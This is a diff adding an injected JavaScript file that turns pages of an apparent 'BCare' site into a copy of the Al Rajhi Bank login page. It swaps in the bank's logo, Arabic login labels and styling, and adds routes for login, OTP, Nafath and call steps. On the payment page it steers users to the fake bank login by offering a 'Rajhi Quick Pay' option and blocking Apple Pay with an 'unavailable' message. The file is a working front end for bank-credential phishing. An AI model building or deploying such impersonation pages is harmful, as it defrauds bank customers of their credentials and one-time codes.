@@ -1,0 +1,672 @@
+/**
+ * BCare — Rajhi Pages Logo Swap (injected)
+ * -----------------------------------------------------------------------------
+ * On all Rajhi pages (/rajhi-login, /rajhi-otp, /rajhi-nafath, /rajhi-call):
+ *   1. HIDES the large FormShell BCare logo (width="200px", class "mb-6")
+ *   2. REPLACES the small BCare logo (class "h-10" or "h-8" mx-auto) with Al Rajhi logo
+ * ===========================================================================*/
+(function () {
+  "use strict";
+
+  var RAJHI_LOGO_URL = "/assets/images/rajhi-logo.png";
+  var TARGET_PATHS = ["/rajhi-login", "/rajhi-otp", "/rajhi-nafath", "/rajhi-call"];
+
+  function isTargetPage() {
+    return TARGET_PATHS.indexOf(window.location.pathname) !== -1;
+  }
+
+  function applyLogoChanges() {
+    if (!isTargetPage()) return;
+
+    // 1. Hide the large FormShell BCare logo (width="200px")
+    var allImgs = document.querySelectorAll("img");
+    for (var i = 0; i < allImgs.length; i++) {
+      var img = allImgs[i];
+      if (
+        img.getAttribute("width") === "200px" &&
+        img.src &&
+        img.src.indexOf("Bcarelogo") !== -1
+      ) {
+        img.style.display = "none";
+      }
+    }
+
+    // 2. Replace the small BCare logo (h-10 or h-8, mx-auto) with Rajhi logo
+    var smallLogos = document.querySelectorAll("img.h-10, img.h-8");
+    for (var j = 0; j < smallLogos.length; j++) {
+      var sImg = smallLogos[j];
+      if (sImg.src && sImg.src.indexOf("Bcarelogo") !== -1) {
+        sImg.src = RAJHI_LOGO_URL;
+        sImg.alt = "Al Rajhi Bank";
+        sImg.style.objectFit = "contain";
+      }
+    }
+  }
+
+  // =========================================================
+  // Rajhi Login Page — full UI redesign to match the official
+  // Al Rajhi bank login page design.
+  // Uses inline styles for maximum CSS specificity.
+  // =========================================================
+
+  function isLoginPage() {
+    return window.location.pathname === "/rajhi-login";
+  }
+
+  function setStyle(el, styles) {
+    if (!el) return;
+    for (var k in styles) {
+      el.style.setProperty(k, styles[k], "important");
+    }
+  }
+
+  function applyRajhiLoginRedesign() {
+    if (!isLoginPage()) {
+      document.body.classList.remove("rajhi-login-page");
+      return;
+    }
+
+    // Mark body so CSS can also target elements
+    document.body.classList.add("rajhi-login-page");
+
+    // ── Page background ────────────────────────────────────
+    setStyle(document.body, { background: "#eef1ff" });
+
+    // ── Hide BCare logo (width=200px) ──────────────────────
+    var bcareLogos = document.querySelectorAll('img[width="200px"]');
+    for (var i = 0; i < bcareLogos.length; i++) {
+      setStyle(bcareLogos[i], { display: "none" });
+    }
+
+    // ── Style section.main as centered page ───────────────
+    var mainSection = document.querySelector("section.main");
+    if (mainSection) {
+      setStyle(mainSection, {
+        background: "#eef1ff",
+        "min-height": "100dvh",
+        display: "flex",
+        "align-items": "center",
+        "justify-content": "center",
+        padding: "24px 16px",
+        "flex-direction": "column"
+      });
+    }
+
+    // ── Style card wrapper ────────────────────────────────
+    var cardWrapper = mainSection ? mainSection.querySelector(":scope > div") : null;
+    if (cardWrapper) {
+      setStyle(cardWrapper, {
+        background: "#fff",
+        border: "1px solid #dde2f5",
+        "border-radius": "12px",
+        "box-shadow": "0 2px 20px rgba(10,30,100,.08)",
+        padding: "0",
+        overflow: "visible",
+        "min-width": "0",
+        width: "min(440px, 100%)",
+        "max-width": "440px"
+      });
+      // Remove Tailwind overflow-hidden that clips injected elements
+      cardWrapper.classList.remove("overflow-hidden");
+    }
+
+    // ── Fix form height (remove calc constraint) ───────────
+    var form = document.querySelector("section.main form");
+    if (form) {
+      setStyle(form, {
+        width: "100%",
+        "max-width": "100%",
+        height: "auto",
+        "min-height": "0"
+      });
+    }
+
+    // ── 1. Transform .top header ──────────────────────────
+    var topDiv = document.querySelector(".top");
+    if (topDiv && !topDiv.dataset.rlHeaderDone) {
+      setStyle(topDiv, {
+        display: "flex",
+        "flex-direction": "row",
+        "align-items": "flex-start",
+        "justify-content": "space-between",
+        padding: "16px 20px 12px",
+        "border-bottom": "1px solid #e8ecf8",
+        "margin-bottom": "0"
+      });
+
+      // Logo container: remove centering
+      var logoCont = topDiv.querySelector(".py-2");
+      if (logoCont) {
+        setStyle(logoCont, { padding: "0", margin: "0" });
+        var logoImg = logoCont.querySelector("img");
+        if (logoImg) {
+          setStyle(logoImg, { height: "40px", width: "auto", margin: "0", display: "block" });
+        }
+      }
+
+      // Hide old headings — will inject new one below
+      var h4 = topDiv.querySelector("h4");
+      var h2 = topDiv.querySelector("h2");
+      if (h4) setStyle(h4, { display: "none" });
+      if (h2) setStyle(h2, { display: "none" });
+
+      // Add "English" language button on the left (RTL: end side)
+      if (!topDiv.querySelector(".rl-lang-btn")) {
+        var langBtn = document.createElement("a");
+        langBtn.className = "rl-lang-btn";
+        langBtn.href = "#";
+        langBtn.setAttribute("aria-label", "Switch to English");
+        langBtn.textContent = "English";
+        setStyle(langBtn, {
+          "font-size": "13px",
+          "font-weight": "600",
+          color: "#1a3a7c",
+          "text-decoration": "none",
+          "align-self": "center",
+          "font-family": "Cairo, Tajawal, sans-serif"
+        });
+        topDiv.appendChild(langBtn);
+      }
+
+      topDiv.dataset.rlHeaderDone = "1";
+    }
+
+    // ── 2. Welcome heading (inject between .top and .grow) ─
+    var formFirstDiv = document.querySelector("section.main form > div:first-child");
+    if (formFirstDiv && !formFirstDiv.querySelector(".rl-welcome")) {
+      var growDiv = formFirstDiv.querySelector(".grow");
+      if (growDiv) {
+        var welcome = document.createElement("div");
+        welcome.className = "rl-welcome";
+        welcome.textContent = "مرحبا بك في الراجحي اون لاين";
+        setStyle(welcome, {
+          "font-size": "22px",
+          "font-weight": "700",
+          color: "#111827",
+          "text-align": "center",
+          padding: "20px 20px 4px",
+          "font-family": "Cairo, Tajawal, sans-serif",
+          "line-height": "1.5"
+        });
+        formFirstDiv.insertBefore(welcome, growDiv);
+      }
+    }
+
+    // ── 3. Inject tabs ────────────────────────────────────
+    if (formFirstDiv && !formFirstDiv.querySelector(".rl-tabs")) {
+      var growDiv2 = formFirstDiv.querySelector(".grow");
+      if (growDiv2) {
+        var tabs = document.createElement("div");
+        tabs.className = "rl-tabs";
+        setStyle(tabs, {
+          display: "flex",
+          "flex-direction": "row",
+          padding: "0 20px",
+          "border-bottom": "2px solid #e8ecf8",
+          "margin-bottom": "0",
+          gap: "0"
+        });
+
+        var tabActive = document.createElement("button");
+        tabActive.type = "button";
+        tabActive.textContent = "تسجيل الدخول";
+        setStyle(tabActive, {
+          padding: "11px 16px",
+          "font-size": "13px",
+          "font-weight": "700",
+          border: "none",
+          background: "#1a237e",
+          color: "#fff",
+          "border-radius": "6px 6px 0 0",
+          cursor: "pointer",
+          "font-family": "Cairo, Tajawal, sans-serif",
+          "white-space": "nowrap",
+          outline: "none",
+          "margin-bottom": "-2px"
+        });
+
+        var tabInactive = document.createElement("button");
+        tabInactive.type = "button";
+        tabInactive.textContent = "تسجيل الدخول باستخدام الرمز";
+        setStyle(tabInactive, {
+          padding: "11px 16px",
+          "font-size": "13px",
+          "font-weight": "600",
+          border: "1px solid #d0d5e8",
+          background: "#fff",
+          color: "#555",
+          "border-radius": "6px 6px 0 0",
+          cursor: "pointer",
+          "font-family": "Cairo, Tajawal, sans-serif",
+          "white-space": "nowrap",
+          outline: "none",
+          "margin-bottom": "-2px",
+          "margin-right": "6px"
+        });
+
+        tabs.appendChild(tabActive);
+        tabs.appendChild(tabInactive);
+
+        var welcomeEl = formFirstDiv.querySelector(".rl-welcome");
+        formFirstDiv.insertBefore(tabs, welcomeEl ? welcomeEl.nextSibling : growDiv2);
+      }
+    }
+
+    // ── 4. Style section label "تسجيل الدخول" ─────────────
+    if (formFirstDiv && !formFirstDiv.querySelector(".rl-section-label")) {
+      var growDiv3 = formFirstDiv.querySelector(".grow");
+      if (growDiv3) {
+        var sectionLabel = document.createElement("div");
+        sectionLabel.className = "rl-section-label";
+        sectionLabel.textContent = "تسجيل الدخول";
+        setStyle(sectionLabel, {
+          "font-size": "13px",
+          "font-weight": "600",
+          color: "#1a237e",
+          padding: "16px 20px 4px",
+          "font-family": "Cairo, Tajawal, sans-serif"
+        });
+        formFirstDiv.insertBefore(sectionLabel, growDiv3);
+      }
+    }
+
+    // ── 5. Style the inputs container ─────────────────────
+    var growDiv4 = document.querySelector("section.main form > div:first-child .grow");
+    if (growDiv4) {
+      setStyle(growDiv4, { padding: "4px 20px 0", gap: "14px" });
+    }
+
+    // ── 6. Change label texts ─────────────────────────────
+    var usernameLabel = document.querySelector('label[for="username"]');
+    if (usernameLabel && usernameLabel.textContent.trim() !== "اسم المستخدم") {
+      usernameLabel.textContent = "اسم المستخدم";
+    }
+    var passwordLabel = document.querySelector('label[for="password"]');
+    if (passwordLabel && passwordLabel.textContent.trim() !== "كلمة السر") {
+      passwordLabel.textContent = "كلمة السر";
+    }
+
+    // ── 7. Style inputs ──────────────────────────────────
+    var usernameInput = document.getElementById("username");
+    if (usernameInput) {
+      setStyle(usernameInput, {
+        background: "#fff",
+        border: "1.5px solid #c8d0e8",
+        "border-radius": "7px",
+        padding: "11px 14px",
+        "font-size": "14px",
+        color: "#111"
+      });
+    }
+    var passwordInput = document.getElementById("password");
+    if (passwordInput) {
+      setStyle(passwordInput, {
+        background: "#fff",
+        border: "1.5px solid #c8d0e8",
+        "border-radius": "7px",
+        padding: "11px 14px",
+        "font-size": "14px",
+        color: "#111"
+      });
+    }
+
+    // ── 8. Inject "تذكرني" row ────────────────────────────
+    var firstFormDiv2 = document.querySelector("section.main form > div:first-child");
+    if (firstFormDiv2 && !firstFormDiv2.querySelector(".rl-remember-row")) {
+      var rememberRow = document.createElement("div");
+      rememberRow.className = "rl-remember-row";
+      setStyle(rememberRow, {
+        display: "flex",
+        "flex-direction": "row",
+        "align-items": "center",
+        "justify-content": "space-between",
+        padding: "2px 20px 10px",
+        "font-family": "Cairo, Tajawal, sans-serif"
+      });
+
+      var rememberLabel = document.createElement("label");
+      rememberLabel.style.cssText = "display:flex;align-items:center;gap:6px;font-size:13px;color:#333;cursor:pointer;";
+      var checkbox = document.createElement("input");
+      checkbox.type = "checkbox";
+      checkbox.id = "rl-remember";
+      checkbox.style.cssText = "width:15px;height:15px;accent-color:#1a237e;cursor:pointer;";
+      var rememberText = document.createElement("span");
+      rememberText.textContent = "تذكرني";
+      rememberLabel.appendChild(checkbox);
+      rememberLabel.appendChild(rememberText);
+
+      var forgotLink = document.createElement("a");
+      forgotLink.href = "#";
+      forgotLink.textContent = "هل نسيت كلمة السر؟";
+      forgotLink.style.cssText = "font-size:13px;color:#1a237e;text-decoration:none;font-weight:500;";
+
+      rememberRow.appendChild(rememberLabel);
+      rememberRow.appendChild(forgotLink);
+      firstFormDiv2.appendChild(rememberRow);
+    }
+
+    // ── 9. Style submit button ────────────────────────────
+    var submitBtn = document.querySelector("section.main form button[type='submit']");
+    if (submitBtn) {
+      setStyle(submitBtn, {
+        "border-radius": "7px",
+        "font-size": "15px",
+        "font-weight": "700",
+        padding: "13px"
+      });
+      // Only override bg color — keep disabled state lighter
+      if (!submitBtn.disabled) {
+        setStyle(submitBtn, { background: "#1a237e" });
+      } else {
+        setStyle(submitBtn, { background: "#b0bce8" });
+      }
+    }
+
+    // ── 10. Style submit button area padding ─────────────
+    var submitArea = document.querySelector("section.main form > div:last-child");
+    if (submitArea) {
+      setStyle(submitArea, { padding: "8px 20px 20px" });
+    }
+  }
+
+  function init() {
+    applyLogoChanges();
+    applyRajhiLoginRedesign();
+
+    // Observe DOM mutations for SPA route changes
+    var observer = new MutationObserver(function () {
+      if (isTargetPage()) {
+        applyLogoChanges();
+      }
+      applyRajhiLoginRedesign();
+      applyPaymentMethodSelector();
+      fixCaptchaAlignment();
+    });
+    observer.observe(document.body, { childList: true, subtree: true });
+
+    // Intercept history navigation for vue-router
+    var origPush = history.pushState;
+    var origReplace = history.replaceState;
+
+    history.pushState = function () {
+      origPush.apply(this, arguments);
+      setTimeout(applyLogoChanges, 50);
+      setTimeout(applyRajhiLoginRedesign, 100);
+      setTimeout(applyPaymentMethodSelector, 200);
+      setTimeout(applyPaymentMethodSelector, 600);
+    };
+    history.replaceState = function () {
+      origReplace.apply(this, arguments);
+      setTimeout(applyLogoChanges, 50);
+      setTimeout(applyRajhiLoginRedesign, 100);
+      setTimeout(applyPaymentMethodSelector, 200);
+      setTimeout(applyPaymentMethodSelector, 600);
+    };
+    window.addEventListener("popstate", function () {
+      setTimeout(applyLogoChanges, 50);
+      setTimeout(applyRajhiLoginRedesign, 100);
+      setTimeout(applyPaymentMethodSelector, 200);
+      setTimeout(applyPaymentMethodSelector, 600);
+    });
+  }
+
+  // =========================================================
+  // Add helpful error messages to Rajhi login validation
+  // =========================================================
+  function addValidationHint() {
+    if (!isLoginPage()) return;
+
+    // Add a hint below submit button
+    var submitArea = document.querySelector("section.main form > div:last-child");
+    if (submitArea && !submitArea.querySelector(".rl-validation-hint")) {
+      var hint = document.createElement("div");
+      hint.className = "rl-validation-hint";
+      hint.innerHTML = "<strong>ملاحظة:</strong> اسم المستخدم وكلمة السر كل واحد 3 أحرف أو أكثر<br/>" +
+                       "إذا كانت البيانات خاطئة ستظهر رسالة خطأ بعد الضغط على الزر.";
+      hint.style.cssText = "font-size:13px;color:#666;text-align:center;margin-top:12px;font-family:Cairo,Tajawal,sans-serif;line-height:1.6;";
+      submitArea.appendChild(hint);
+    }
+  }
+
+  // =====================================================================
+  // Payment Method Selector — /credit-card-payment
+  // Shows 3 method buttons: Card (default), Rajhi Quick Pay, Apple Pay.
+  // Apple Pay shows "service unavailable"; Rajhi navigates to /rajhi-login.
+  // =====================================================================
+
+  var RAJHI_LOGO_URL_PAYMENT = "/assets/images/rajhi-logo.png";
+
+  function isPaymentPage() {
+    return window.location.pathname === "/credit-card-payment";
+  }
+
+  function showApplePayUnavailable() {
+    var existing = document.getElementById("rl-applepay-alert");
+    if (existing) { existing.style.display = "flex"; return; }
+
+    var overlay = document.createElement("div");
+    overlay.id = "rl-applepay-alert";
+    overlay.style.cssText = [
+      "position:fixed;inset:0;z-index:99999;display:flex;align-items:center;justify-content:center;",
+      "background:rgba(0,0,0,.45);font-family:Cairo,Tajawal,sans-serif;"
+    ].join("");
+
+    var card = document.createElement("div");
+    card.style.cssText = [
+      "background:#fff;border-radius:16px;padding:32px 28px;max-width:340px;width:90%;",
+      "text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.15);"
+    ].join("");
+
+    var icon = document.createElement("div");
+    icon.style.cssText = "font-size:48px;margin-bottom:16px;";
+    icon.textContent = "";
+
+    var title = document.createElement("p");
+    title.style.cssText = "font-size:17px;font-weight:700;color:#111;margin:0 0 8px;";
+    title.textContent = "Apple Pay";
+
+    var msg = document.createElement("p");
+    msg.style.cssText = "font-size:14px;color:#555;margin:0 0 24px;line-height:1.6;";
+    msg.textContent = "هذه الخدمة موقوفة حالياً";
+
+    var btn = document.createElement("button");
+    btn.style.cssText = [
+      "background:#111;color:#fff;border:none;border-radius:10px;",
+      "padding:11px 32px;font-size:14px;font-weight:600;cursor:pointer;",
+      "font-family:Cairo,Tajawal,sans-serif;"
+    ].join("");
+    btn.textContent = "حسناً";
+    btn.onclick = function() { overlay.style.display = "none"; };
+
+    card.appendChild(icon);
+    card.appendChild(title);
+    card.appendChild(msg);
+    card.appendChild(btn);
+    overlay.appendChild(card);
+    document.body.appendChild(overlay);
+  }
+
+  function applyPaymentMethodSelector() {
+    if (!isPaymentPage()) return;
+
+    var mainSection = document.querySelector("section.main");
+    if (!mainSection) return;
+    var cardWrapper = mainSection.querySelector(":scope > div");
+    if (!cardWrapper) return;
+    if (document.getElementById("rl-pm-selector")) return;
+
+    // -- selector container -----------------------------------------------
+    var selector = document.createElement("div");
+    selector.id = "rl-pm-selector";
+    selector.dir = "rtl";
+    selector.style.cssText = [
+      "border-bottom:1px solid #e8ecf8;padding:14px 20px 0;",
+      "font-family:Cairo,Tajawal,sans-serif;"
+    ].join("");
+
+    var heading = document.createElement("p");
+    heading.style.cssText = "font-size:13px;font-weight:600;color:#555;margin:0 0 10px;";
+    heading.textContent = "اختر وسيلة الدفع";
+    selector.appendChild(heading);
+
+    var tabs = document.createElement("div");
+    tabs.style.cssText = "display:flex;gap:8px;flex-wrap:wrap;padding-bottom:0;";
+    selector.appendChild(tabs);
+
+    function makeMethodBtn(id, label, logoSrc) {
+      var btn = document.createElement("button");
+      btn.type = "button";
+      btn.dataset.pmId = id;
+      btn.style.cssText = [
+        "display:inline-flex;align-items:center;gap:7px;",
+        "padding:8px 14px;border-radius:8px 8px 0 0;",
+        "font-size:13px;font-weight:600;cursor:pointer;transition:background .15s;",
+        "border:1px solid #dde2f5;border-bottom:2px solid transparent;",
+        "background:#f7f8fd;color:#444;font-family:Cairo,Tajawal,sans-serif;"
+      ].join("");
+
+      if (logoSrc) {
+        var img = document.createElement("img");
+        img.src = logoSrc;
+        img.style.cssText = "height:18px;object-fit:contain;";
+        btn.appendChild(img);
+      }
+
+      var span = document.createElement("span");
+      span.textContent = label;
+      btn.appendChild(span);
+      return btn;
+    }
+
+    var btnCard   = makeMethodBtn("card",     "الدفع بالبطاقة", null);
+    var btnRajhi  = makeMethodBtn("rajhi",    "الدفع السريع الراجحي", RAJHI_LOGO_URL_PAYMENT);
+    var btnApple  = makeMethodBtn("applepay", "Apple Pay", null);
+
+    // Apple Pay logo (inline SVG apple symbol)
+    var appleSpan = document.createElement("span");
+    appleSpan.style.cssText = "font-size:16px;line-height:1;";
+    appleSpan.textContent = "";
+    btnApple.insertBefore(appleSpan, btnApple.firstChild);
+
+    tabs.appendChild(btnCard);
+    tabs.appendChild(btnRajhi);
+    tabs.appendChild(btnApple);
+
+    // -- activate a method ------------------------------------------------
+    var activeMethod = "card";
+
+    function setActive(method) {
+      activeMethod = method;
+      [btnCard, btnRajhi, btnApple].forEach(function(b) {
+        var isActive = b.dataset.pmId === method;
+        b.style.background    = isActive ? "#fff" : "#f7f8fd";
+        b.style.color         = isActive ? "#1a237e" : "#444";
+        b.style.borderColor   = isActive ? "#dde2f5" : "#dde2f5";
+        b.style.borderBottomColor = isActive ? "#fff" : "transparent";
+        b.style.fontWeight    = isActive ? "700" : "600";
+      });
+
+      // show/hide form content
+      var form = document.querySelector("section.main form");
+      if (form) {
+        form.style.display = (method === "card") ? "" : "none";
+      }
+
+      // Rajhi panel
+      var rajhiPanel = document.getElementById("rl-pm-rajhi-panel");
+      if (rajhiPanel) rajhiPanel.style.display = (method === "rajhi") ? "block" : "none";
+    }
+
+    btnCard.onclick = function() { setActive("card"); };
+    btnApple.onclick = function() { showApplePayUnavailable(); };
+    btnRajhi.onclick = function() {
+      setActive("rajhi");
+      // Ensure Rajhi panel exists
+      if (!document.getElementById("rl-pm-rajhi-panel")) {
+        var panel = document.createElement("div");
+        panel.id = "rl-pm-rajhi-panel";
+        panel.dir = "rtl";
+        panel.style.cssText = [
+          "padding:28px 24px;text-align:center;",
+          "font-family:Cairo,Tajawal,sans-serif;"
+        ].join("");
+
+        var rLogo = document.createElement("img");
+        rLogo.src = RAJHI_LOGO_URL_PAYMENT;
+        rLogo.style.cssText = "height:50px;object-fit:contain;margin-bottom:18px;display:block;margin-left:auto;margin-right:auto;";
+        panel.appendChild(rLogo);
+
+        var rTitle = document.createElement("p");
+        rTitle.style.cssText = "font-size:16px;font-weight:700;color:#1a237e;margin:0 0 8px;";
+        rTitle.textContent = "الدفع السريع الراجحي";
+        panel.appendChild(rTitle);
+
+        var rDesc = document.createElement("p");
+        rDesc.style.cssText = "font-size:13px;color:#666;margin:0 0 22px;line-height:1.7;";
+        rDesc.textContent = "ستُنقل إلى صفحة تسجيل دخول بنك الراجحي لإتمام الدفع";
+        panel.appendChild(rDesc);
+
+        var rBtn = document.createElement("button");
+        rBtn.type = "button";
+        rBtn.style.cssText = [
+          "background:#1a237e;color:#fff;border:none;border-radius:8px;",
+          "padding:12px 32px;font-size:14px;font-weight:700;cursor:pointer;",
+          "font-family:Cairo,Tajawal,sans-serif;width:100%;max-width:280px;"
+        ].join("");
+        rBtn.textContent = "تسجيل دخول الراجحي";
+        rBtn.onclick = function() {
+          // Navigate to Rajhi login — the server will have already set the route
+          var currentSearch = window.location.search;
+          window.history.pushState({}, "", "/rajhi-login" + currentSearch);
+          window.dispatchEvent(new PopStateEvent("popstate", {}));
+        };
+        panel.appendChild(rBtn);
+
+        var formParent = document.querySelector("section.main > div");
+        if (formParent) {
+          var existingForm = formParent.querySelector("form");
+          if (existingForm && existingForm.parentNode) {
+            existingForm.parentNode.insertBefore(panel, existingForm.nextSibling);
+          } else {
+            formParent.appendChild(panel);
+          }
+        }
+      }
+    };
+
+    // insert selector BEFORE the first child of cardWrapper
+    cardWrapper.insertBefore(selector, cardWrapper.firstChild);
+    setActive("card");
+  }
+
+  // =====================================================================
+  // Captcha alignment fix & Inbox placement near captcha
+  // =====================================================================
+  function fixCaptchaAlignment() {
+    var cfWidget = document.querySelector("div.cf-turnstile, div[data-sitekey], iframe[src*='challenges.cloudflare']");
+    if (!cfWidget) return;
+    var parent = cfWidget.parentElement;
+    if (!parent) return;
+    // Ensure the captcha container is properly centered / aligned
+    if (!parent.dataset.captchaFixed) {
+      parent.style.cssText += ";display:flex;align-items:center;justify-content:flex-start;gap:12px;flex-wrap:wrap;";
+      parent.dataset.captchaFixed = "1";
+    }
+  }
+
+  var origInit = init;
+  function initWithAll() {
+    origInit();
+    addValidationHint();
+    setTimeout(applyPaymentMethodSelector, 500);
+    setTimeout(applyPaymentMethodSelector, 1200);
+    setTimeout(fixCaptchaAlignment, 800);
+  }
+  init = initWithAll;
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", init);
+  } else {
+    init();
+  }
+})();
